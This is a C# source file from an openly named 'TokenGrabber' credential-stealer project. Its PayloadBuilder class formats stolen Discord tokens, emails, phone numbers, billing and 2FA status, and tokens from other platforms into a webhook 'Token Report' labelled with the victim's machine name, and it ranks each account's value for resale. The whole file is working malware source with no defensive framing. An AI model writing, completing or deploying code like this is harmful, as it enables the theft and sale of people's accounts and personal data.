namespace TokenGrabber.Exfil;

using System.Text.Json;
using TokenGrabber.Discord;
using TokenGrabber.Models;

internal static class PayloadBuilder
{
    public static string Build(List<GrabbedToken> tokens, List<AccountData> accounts)
    {
        var embeds = new List<object>();

        foreach (var account in accounts)
        {
            embeds.Add(BuildAccountEmbed(account));
        }

        var nonDiscordTokens = tokens.Where(t => t.Platform != "Discord").ToList();
        if (nonDiscordTokens.Count > 0)
        {
            embeds.Add(BuildTokenListEmbed(nonDiscordTokens));
        }

        var payload = new
        {
            content = $"**Token Report** | `{Environment.MachineName}` | {DateTime.UtcNow:u}",
            embeds
        };

        return JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = false });
    }

    private static object BuildAccountEmbed(AccountData account)
    {
        var nitroStatus = NitroChecker.GetNitroTypeName(account.NitroType);
        var valueRating = NitroChecker.FormatAccountValue(account.NitroType, account.HasBilling, account.GuildCount);

        return new
        {
            title = $"\uD83D\uDC64 {account.Username}#{account.Discriminator}",
            color = GetColorForValue(valueRating),
            fields = new object[]
            {
                new { name = "User ID", value = $"`{account.UserId}`", inline = true },
                new { name = "Email", value = account.Email ?? "N/A", inline = true },
                new { name = "Phone", value = account.Phone ?? "N/A", inline = true },
                new { name = "Nitro", value = nitroStatus, inline = true },
                new { name = "Billing", value = account.HasBilling ? "Yes" : "No", inline = true },
                new { name = "Guilds", value = account.GuildCount.ToString(), inline = true },
                new { name = "2FA", value = account.MfaEnabled ? "Enabled" : "Disabled", inline = true },
                new { name = "Value", value = $"**{valueRating}**", inline = true },
                new { name = "Token", value = $"```{account.Token}```", inline = false }
            },
            footer = new { text = $"Grabbed at {DateTime.UtcNow:u}" }
        };
    }

    private static object BuildTokenListEmbed(List<GrabbedToken> tokens)
    {
        var grouped = tokens.GroupBy(t => t.Platform);
        var fields = grouped.Select(g => new
        {
            name = g.Key,
            value = string.Join("\n", g.Select(t => $"`{Truncate(t.Token, 40)}` ({t.Source})")),
            inline = false
        }).ToArray();

        return new
        {
            title = "\uD83D\uDD11 Other Tokens",
            color = 0x5865F2,
            fields
        };
    }

    private static int GetColorForValue(string rating) => rating switch
    {
        "HIGH" => 0xFF0000,
        "MEDIUM" => 0xFF8C00,
        "LOW" => 0xFFFF00,
        _ => 0x808080
    };

    private static string Truncate(string value, int maxLength) =>
        value.Length <= maxLength ? value : value[..maxLength] + "...";
}
